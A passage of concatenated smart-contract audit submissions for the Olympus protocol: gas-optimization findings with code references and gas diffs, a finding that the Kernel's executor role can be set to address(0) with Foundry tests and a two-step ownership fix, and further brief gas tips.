├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ revokePolicyApprovals                                         ┆ 6956            ┆ 6956  ┆ 6956   ┆ 6956  ┆ 1       │ +│ revokePolicyApprovals                                         ┆ 6842            ┆ 6842  ┆ 6842   ┆ 6842  ┆ 1       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setActiveStatus                                               ┆ 733             ┆ 733   ┆ 733    ┆ 733   ┆ 6       │  ╰───────────────────────────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ```     ### [G&#x2011;06]  Using `storage` instead of `memory` for structs/arrays saves gas When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct  *There are 4 instances of this issue:* ```solidity File: src/policies/Operator.sol  206:          Config memory config_ = _config;  385:              Config memory config_ = _config;  440:              Config memory config_ = _config;  666:          Regen memory regen = _status.low;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L206  ```diff diff --git a/src/policies/Operator.sol b/src/policies/Operator.sol index 7573526..e3c5c53 100644 --- a/src/policies/Operator.sol +++ b/src/policies/Operator.sol @@ -203,7 +203,7 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          _updateCapacity(false, 0);            /// Cache config in memory -        Config memory config_ = _config; +        Config storage config_ = _config;            /// Check if walls can regenerate capacity          if ( @@ -437,7 +437,7 @@ contract Operator is IOperator, Policy, ReentrancyGuard {              uint256 minimumPrice = invCushionPrice.mulDiv(bondScale, oracleScale);                /// Cache config struct to avoid multiple SLOADs -            Config memory config_ = _config; +            Config storage config_ = _config;                /// Calculate market capacity from the cushion factor              uint256 marketCapacity = range.low.capacity.mulDiv(config_.cushionFactor, FACTOR_SCALE); @@ -663,7 +663,7 @@ contract Operator is IOperator, Policy, ReentrancyGuard {          /// Update low side regen status with a new observation          /// Observation is positive if the current price is greater than the MA          uint32 observe = _config.regenObserve; -        Regen memory regen = _status.low; +        Regen storage regen = _status.low;          if (currentPrice >= movingAverage) {              if (!regen.observations[regen.nextObservation]) {                  _status.low.observations[regen.nextObservation] = true; ```  ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..0d24e75 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -371,7 +371,7 @@  ╞═════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                             ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 4679925                                     ┆ 25703           ┆        ┆        ┆        ┆         │ +│ 4594613                                     ┆ 25277           ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                               ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -397,7 +397,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                    ┆ 439             ┆ 439    ┆ 439    ┆ 439    ┆ 63      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ operate                                     ┆ 387             ┆ 122263 ┆ 37958  ┆ 640609 ┆ 104     │ +│ operate                                     ┆ 387             ┆ 118525 ┆ 34414  ┆ 636359 ┆ 104     │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ regenerate                                  ┆ 3772            ┆ 17622  ┆ 21791  ┆ 29292  ┆ 6       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ ```  ### [G&#x2011;07]  State variables should be cached in stack variables rather than re-reading them from storage The instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.  *There are 7 instances of this issue:* ```solidity File: src/modules/PRICE.sol  /// @audit _movingAverage on line 138 146:          emit NewObservation(block.timestamp, currentPrice, _movingAverage);  /// @audit nextObsIndex on line 185 185:          uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;  /// @audit numObservations on line 97 100:          observations = new uint256[](numObservations);  /// @audit observationFrequency on line 165 171:              if (updatedAt < block.timestamp - uint256(observationFrequency))  /// @audit observationFrequency on line 242 246:          uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency);  /// @audit movingAverageDuration on line 268 272:          uint256 newObservations = uint256(movingAverageDuration / observationFrequency_);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L146  ```solidity File: src/policies/Heart.sol  /// @audit reward on line 112 113:          emit RewardIssued(to_, reward);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L113  ### [G&#x2011;08]  Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata  *There is 1 instance of this issue:* ```solidity File: src/Kernel.sol  /// @audit moduleDependents[keycode] on line 309 310:              getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L310  ### [G&#x2011;09]  The result of function calls should be cached rather than re-calling the function The instances below point to the second+ call of the function within a single function  *There are 3 instances of this issue:* ```solidity File: src/policies/PriceConfig.sol  /// @audit PRICE.KEYCODE() on line 32 33:           permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);  /// @audit PRICE.KEYCODE() on line 32 34:           permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L33  ```solidity File: src/policies/VoterRegistration.sol  /// @audit VOTES.KEYCODE() on line 34 35:           permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L35  ### [G&#x2011;10]  `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**  *There are 3 instances of this issue:* ```solidity File: src/modules/PRICE.sol  136:              _movingAverage += (currentPrice - earliestPrice) / numObs;  138:              _movingAverage -= (earliestPrice - currentPrice) / numObs;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L136  ```solidity File: src/policies/Heart.sol  103:          lastBeat += frequency();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L103  ### [G&#x2011;11]  `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 9 instances of this issue:* ```solidity File: src/Kernel.sol  266:      function _installModule(Module newModule_) internal {  279:      function _upgradeModule(Module newModule_) internal {  295:      function _activatePolicy(Policy policy_) internal {  325:      function _deactivatePolicy(Policy policy_) internal {  351:      function _migrateKernel(Kernel newKernel_) internal {  378:      function _reconfigurePolicies(Keycode keycode_) internal {  409:      function _pruneFromDependents(Policy policy_) internal {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L266  ```solidity File: src/policies/Heart.sol  111:      function _issueReward(address to_) internal {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111  ```solidity File: src/policies/Operator.sol  652       function _addObservation() internal { 653           /// Get latest moving average from the price module 654:          uint256 movingAverage = PRICE.getMovingAverage();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L652-L654  ### [G&#x2011;12]  Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There is 1 instance of this issue:* ```solidity File: src/modules/PRICE.sol  /// @audit if-condition on line 135 136:              _movingAverage += (currentPrice - earliestPrice) / numObs;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L136  ### [G&#x2011;13]  `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There is 1 instance of this issue:* ```solidity File: src/policies/Governance.sol  278:          for (uint256 step; step < instructions.length; ) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278  ### [G&#x2011;14]  Optimize names to save gas `public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)  *There are 20 instances of this issue:* ```solidity File: src/interfaces/IBondCallback.sol  /// @audit callback(), amountsForMarket(), whitelist() 6:    interface IBondCallback {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/interfaces/IBondCallback.sol#L6  ```solidity File: src/Kernel.sol  /// @audit changeKernel() 62:   abstract contract KernelAdapter {  /// @audit KEYCODE(), VERSION(), INIT() 84:   abstract contract Module is KernelAdapter {  /// @audit setActiveStatus(), configureDependencies(), requestPermissions() 111:  abstract contract Policy is KernelAdapter {  /// @audit executeAction(), grantRole(), revokeRole() 149:  contract Kernel {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L62  ```solidity File: src/modules/INSTR.sol  /// @audit getInstructions(), store() 10:   contract OlympusInstructions is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L10  ```solidity File: src/modules/MINTR.sol  /// @audit mintOhm(), burnOhm() 8:    contract OlympusMinter is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L8  ```solidity File: src/modules/PRICE.sol  /// @audit updateMovingAverage(), getCurrentPrice(), getLastPrice(), getMovingAverage(), initialize(), changeMovingAverageDuration(), changeObservationFrequency() 22:   contract OlympusPrice is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L22  ```solidity File: src/modules/RANGE.sol  /// @audit updateCapacity(), updatePrices(), regenerate(), updateMarket(), setSpreads(), setThresholdFactor(), range(), capacity(), active(), price(), spread(), market(), lastActive() 16:   contract OlympusRange is Module {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L16  ```solidity File: src/modules/TRSRY.sol  /// @audit getReserveBalance(), setApprovalFor(), withdrawReserves(), getLoan(), repayLoan(), setDebt() 17:   contract OlympusTreasury is Module, ReentrancyGuard {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L17  ```solidity File: src/modules/VOTES.sol  /// @audit mintTo(), burnFrom() 11:   contract OlympusVotes is Module, ERC20 {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L11  ```solidity File: src/policies/BondCallback.sol  /// @audit batchToTreasury(), setOperator() 17:   contract BondCallback is Policy, ReentrancyGuard, IBondCallback {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L17  ```solidity File: src/policies/Governance.sol  /// @audit getMetadata(), getActiveProposal(), submitProposal(), endorseProposal(), activateProposal(), vote(), executeProposal(), reclaimVotes() 51:   contract OlympusGovernance is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L51  ```solidity File: src/policies/Heart.sol  /// @audit beat(), frequency(), resetBeat(), toggleBeat(), setRewardTokenAndAmount(), withdrawUnspentRewards() 21:   contract OlympusHeart is IHeart, Policy, ReentrancyGuard {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L21  ```solidity File: src/policies/interfaces/IHeart.sol  /// @audit beat(), frequency(), resetBeat(), toggleBeat(), setRewardTokenAndAmount(), withdrawUnspentRewards() 6:    interface IHeart {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IHeart.sol#L6  ```solidity File: src/policies/interfaces/IOperator.sol  /// @audit operate(), swap(), getAmountOut(), setSpreads(), setThresholdFactor(), setCushionFactor(), setCushionParams(), setReserveFactor(), setRegenParams(), setBondContracts(), initialize(), regenerate(), toggleActive(), fullCapacity(), status(), config() 8:    interface IOperator {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IOperator.sol#L8  ```solidity File: src/policies/Operator.sol  /// @audit bondPurchase(), setSpreads(), setThresholdFactor(), setCushionFactor(), setCushionParams(), setReserveFactor(), setRegenParams(), setBondContracts(), initialize(), regenerate(), toggleActive(), getAmountOut() 30:   contract Operator is IOperator, Policy, ReentrancyGuard {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L30  ```solidity File: src/policies/PriceConfig.sol  /// @audit initialize(), changeMovingAverageDuration(), changeObservationFrequency() 7:    contract OlympusPriceConfig is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L7  ```solidity File: src/policies/TreasuryCustodian.sol  /// @audit grantApproval(), revokePolicyApprovals(), increaseDebt(), decreaseDebt() 15:   contract TreasuryCustodian is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L15  ```solidity File: src/policies/VoterRegistration.sol  /// @audit issueVotesTo(), revokeVotesFrom() 9:    contract VoterRegistration is Policy {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L9  ### [G&#x2011;15]  Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past  *There are 11 instances of this issue:* ```solidity File: src/Kernel.sol  113:      bool public isActive;  181:      mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;  194:      mapping(address => mapping(Role => bool)) public hasRole;  197:      mapping(Role => bool) public isRole;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L113  ```solidity File: src/modules/PRICE.sol  62:       bool public initialized;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L62  ```solidity File: src/policies/BondCallback.sol  24:       mapping(address => mapping(uint256 => bool)) public approvedMarkets;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L24  ```solidity File: src/policies/Governance.sol  105:      mapping(uint256 => bool) public proposalHasBeenActivated;  117:      mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L105  ```solidity File: src/policies/Heart.sol  33:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L33  ```solidity File: src/policies/Operator.sol  63:       bool public initialized;  66:       bool public active;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L63  ### [G&#x2011;16]  Use a more recent version of solidity Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  *There are 3 instances of this issue:* ```solidity File: src/interfaces/IBondCallback.sol  2:    pragma solidity >=0.8.0;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/interfaces/IBondCallback.sol#L2  ```solidity File: src/policies/interfaces/IHeart.sol  2:    pragma solidity >=0.8.0;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IHeart.sol#L2  ```solidity File: src/policies/interfaces/IOperator.sol  2:    pragma solidity >=0.8.0;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/interfaces/IOperator.sol#L2  ### [G&#x2011;17]  `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) Saves **5 gas per loop**  *There are 7 instances of this issue:* ```solidity File: src/policies/Operator.sol  488:              decimals++;  670:                  _status.low.count++;  675:                  _status.low.count--;  686:                  _status.high.count++;  691:                  _status.high.count--;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488  ```solidity File: src/utils/KernelUtils.sol  49:               i++;  64:               i++;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L49  ### [G&#x2011;18]  Using `private` rather than `public` for constants, saves gas If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table  *There are 11 instances of this issue:* ```solidity File: src/modules/PRICE.sol  59:       uint8 public constant decimals = 18;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L59  ```solidity File: src/modules/RANGE.sol  65:       uint256 public constant FACTOR_SCALE = 1e4;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65  ```solidity File: src/policies/Governance.sol  121:      uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:      uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:      uint256 public constant GRACE_PERIOD = 1 weeks;  130:      uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:      uint256 public constant EXECUTION_THRESHOLD = 33;  137:      uint256 public constant EXECUTION_TIMELOCK = 3 days;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L121  ```solidity File: src/policies/Operator.sol  83:       uint8 public immutable ohmDecimals;  86:       uint8 public immutable reserveDecimals;  89:       uint32 public constant FACTOR_SCALE = 1e4;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L83  ### [G&#x2011;19]  Don't compare boolean  ... See the rest this report [here](https://github.com/code-423n4/2022-08-olympus-findings/blob/main/data/IllIllI-G.md)
# Lines of code  https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L192   # Vulnerability details  ### Impact  The `executor` and `admin` roles are important administrative roles that can be set to any arbitrary address that the organisation does not control e.g. `address(0).`   This impact is that the system can no longer be  administered as the `executor` role is the key administrator role for adding, upgrading and removing Kernels, Modules, Policies, Executors and Admins.  Both the `admin` and `executor` roles can be set to an arbitrary address in a single step however it is worse if the `executor` is changed to something like  `address(0)` as no other role can change it back. The `executor` can change the `admin` role but the `admin` cannot change the executor.  Due to the impact I believe this to be of Medium to High severity.  ### Proof of Concept  Below is a test demonstrating that the `executor` role can be set to `address(0)` by the current `executor`;  ```solidity function testCorrectness_ChangeExecutorToAddressZero() public {   // Demonstrate how the executor role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeExecutor, address(multisig));   vm.stopPrank();   assertEq(kernel.executor(), address(multisig));    // As the current executor set the new executor to be address(0).   vm.prank(multisig);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank();   assertEq(kernel.executor(), address(0)); } ```  The `admin` role cannot modify the `executor` so if it is set to a arbitrary address that Olympus does not control it cannot be reset;  ```solidity function testCorrectness_AdminCannotChangeExecutor() public {   // Demonstrate how the admin role can be changed by setting   // it to the multisig address.   vm.startPrank(deployer);   kernel.executeAction(Actions.ChangeAdmin, address(multisig));   vm.stopPrank();   assertEq(kernel.admin(), address(multisig));    // As the current admin try and change the executor.   vm.prank(multisig);   err = abi.encodeWithSignature("Kernel_OnlyExecutor(address)", multisig);   vm.expectRevert(err);   kernel.executeAction(Actions.ChangeExecutor, address(0));   vm.stopPrank(); } ```  ### Tools Used  Vim  ### Recommended Remediation Steps  The Kernel should implement a two step ownership change for crucial roles such as the `executor` and `admin`. In the first step the ownership change is ‘proposed’ and the address of the new owner (for `executor` or `admin`) is stored in a state variable. As part of the proposal `address(0)` can be checked and a revert take place. In the second step the new owner would then need to ‘accept’ the ownership change by executing a function on the smart contract.   Furthermore I feel that the `executor` should not not be able to change the `admin` role via `Actions.ChangeAdmin` on [L212](https://github.com/fullyallocated/Default/blob/master/src/Kernel.sol#L212) and the `admin` should be able to set a new `executor`. This would ensure there is proper separation of duties between the `admin` and the `executor` roles.
1. Use `external` modifier instead of `public` to save deployment gas. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L145 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L151 2. Check revert things on top of the function. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L48 
## USE CALLDATA INSTEAD OF MEMORY  When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memoryindex. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution. Structs have the same overhead as an array of length one  When arguments are read-only on external functions, the data location should be calldata  7 instances:  -Kernel.sol line 393 -PRICE.sol line 205 -BondCallback.sol line 152 -Governance.sol line 162 -Operator lines 96, 97 -TreasuryCustodian..sol line 53  ## <ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP  Reading array length at each iteration of the loop consumes more gas than necessary. In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Consider storing the array’s length in a variable before the for-loop, and use this new variable instead  1 instance: Governance.sol lines 278  ## ++i COSTS LESS GAS THAN i++, ESPECIALLY WHEN IT’S USED IN FOR-LOOPS (--I/I-- TOO)  This saves 6 gas per instace  2 instances: KernelUtils.sol lines 49, 64  ## IT COSTS MORE GAS TO INITIALIZE VARIABLES WITH THEIR DEFAULT VALUE THAN LETTING THE DEFAULT VALUE BE APPLIED  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example:  ` for (uint256 i = 0; i < numIterations; ++i) {  ` should be replaced with:  ` for (uint256 i; i < numIterations; ++i) { `  3 instances: Kernel.sol line 397 KernelUtils.sol lines 43, 58   ## USING > 0 COSTS MORE GAS THAN != 0 WHEN USED ON A UINT  This 